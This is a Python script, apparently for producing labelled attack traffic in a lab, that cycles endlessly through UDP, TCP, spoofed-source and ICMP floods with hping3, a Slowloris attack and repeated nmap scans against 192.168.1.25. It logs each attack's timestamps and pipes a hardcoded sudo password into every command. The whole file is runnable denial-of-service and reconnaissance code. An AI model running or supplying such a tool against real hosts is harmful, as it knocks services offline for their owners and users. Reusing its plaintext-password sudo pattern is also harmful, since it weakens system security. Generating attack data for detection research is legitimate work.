import subprocess
import time
from datetime import datetime
import subprocess
import os
import signal


commands = [
    ("UDP Flood", ["bash", "-c", "echo 1234 | sudo -S hping3 --flood --udp -p 80 192.168.1.25"]),
    ("Slowloris", ["python3", "slowloris.py", "192.168.1.25", "-s", "500"]),
    ("TCP Flood", ["bash", "-c", "echo 1234 | sudo -S hping3 --flood -p 80 192.168.1.25"]),
    ("Synonymous Flood", ["bash", "-c", "echo 1234 | sudo -S hping3 --flood --rand-source -p 80 192.168.1.25"]),
    ("Portscan", ["bash", "-c", "for i in {1..1000}; do echo 1234 | sudo -S nmap -sT 192.168.1.25; sleep 1; done"]),
    ("OS Fingerprinting", ["bash", "-c", "for i in {1..1000}; do echo 1234 | sudo -S nmap -O 192.168.1.25; sleep 1; done"]),
    ("Aggressive Scan", ["bash", "-c", "for i in {1..1000}; do echo 1234 | sudo -S nmap -A 192.168.1.25; sleep 1; done"]),
    ("ICMP Flood", ["bash", "-c", "echo 1234 | sudo -S hping3 --flood -1 192.168.1.25"]),
]

LOG_FILE = "timestamp_attacks.txt"
RUN_TIME = 10 * 60      # 10 minutes
BREAK_TIME = 5 * 60    # 5 minutes

def log_msg(msg):
    with open(LOG_FILE, "a") as f:
        f.write(msg + "\n")

while True:
    for name, cmd in commands:
        start_time = datetime.now()
        print(f"Starte {name}: {' '.join(cmd)}")
        log_msg(f"Start: {start_time.strftime('%Y-%m-%d %H:%M:%S')} - Angriff: {name} - Befehl: {' '.join(cmd)}")
        
        try:
            # Prozess in eigener Prozessgruppe starten
            proc = subprocess.Popen(cmd, preexec_fn=os.setsid)
            proc.wait(timeout=RUN_TIME)
            note = "Erfolgreich beendet"
        except subprocess.TimeoutExpired:
            # SIGTERM an ganze Prozessgruppe senden
            os.killpg(proc.pid, signal.SIGTERM)
            try:
                proc.wait(10)  # 10 Sekunden warten
                note = "Nach Timeout terminiert"
            except subprocess.TimeoutExpired:
                # Bei weiterlaufenden Prozessen: SIGKILL senden
                os.killpg(proc.pid, signal.SIGKILL)
                proc.wait()
                note = "Nach Timeout gekillt"
        
        end_time = datetime.now()
        log_msg(f"Ende: {end_time.strftime('%Y-%m-%d %H:%M:%S')} ({note})")
        log_msg("Pause startet jetzt.\n")
        print(f"Pause für {BREAK_TIME//60} Minuten.")
        time.sleep(BREAK_TIME)

